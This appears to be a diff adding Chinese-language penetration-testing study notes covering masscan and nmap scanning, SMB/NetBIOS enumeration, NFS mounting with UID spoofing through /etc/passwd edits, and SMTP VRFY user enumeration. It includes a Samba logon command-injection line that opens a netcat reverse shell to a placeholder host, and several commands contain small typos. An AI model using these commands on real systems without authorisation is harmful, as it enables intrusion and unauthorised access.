@@ -1,0 +1,55 @@
+先IP发现 后端口发现 应用发现
+masscan
+sudo apt install masscan
+sudo masscan -p80 10.0.0.0/8
+sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --route-ip 10.11.0.1
+--rate 发包速率
+-e 发包网卡
+--router-ip 发包ip
+
+主机发现
+sudo nmap -sn 10.0.2.0/24
+
+全端口扫描
+sudo nmap -p- x.x.x.x
+过滤open状态
+sudo nmap -p- x.x.x.x --open
+
+扫描服务应用+版本 
+sudo nmap -p21,22,23 -sV 10.0.2.72
+
+
+
+SMB枚举 （139，445） （SMB协议）
+扫描NetBIOS服务 
+TCP 139，UDP137,138
+SMB(TCP 445)和NETBIOS是两个独立的协议
+脚本扫描 -A SMB基本扫描
+sudo nmap -p139,445 -A xxx.xxx.xxx.xxx
+
+NETBIOS枚举工具
+sudo nbtscan -r x.x.x.x/24
+
+ls /usr/share/nmap/script | grep "smb"
+
+
+NFC枚举 端口：111，2049（自定义）
+客户端连接
+smbclient -L //xx.xx.xx.xx
+反弹shell
+logon "/='nc xxx.xx.xx.xx xx -e /bin/bash'"
+
+挂载NFC
+mkdir home
+sudo mount -o nolock x.x.x.x:/home~/home/
+cd home/user1 && ls-lan
+
+sudo adduser pwn
+sudo sed -i -e's/1001/1014/g' -/etc/passwd
+
+SMTP
+nc -nv xxx.xx.xx.xx 25
+VRFY root
+VRFY idontexist
+
+
